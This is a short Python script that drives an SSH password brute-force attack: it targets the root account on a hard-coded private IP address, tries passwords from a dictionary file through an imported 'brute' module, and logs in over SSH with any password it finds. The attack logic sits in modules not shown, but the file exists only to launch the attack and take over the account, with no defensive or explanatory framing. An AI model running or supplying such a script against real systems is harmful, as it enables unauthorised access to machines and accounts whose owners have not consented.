#!/usr/bin/env python3
# coding=utf-8
__author__="riverchu"

from brute import bruteSSH
from brute import loginSSH

if __name__=="__main__":
    target=('10.108.36.71','root')
    dic = dict()
    dic['passwdFile']='./data/dictionary.txt'
    ret = bruteSSH.bruteSSH(*target,**dic)

    if ret['type']=='password' and ret['key']!=None:
        loginSSH.start_ssh(ret['host'],ret['user'],ret['key'])
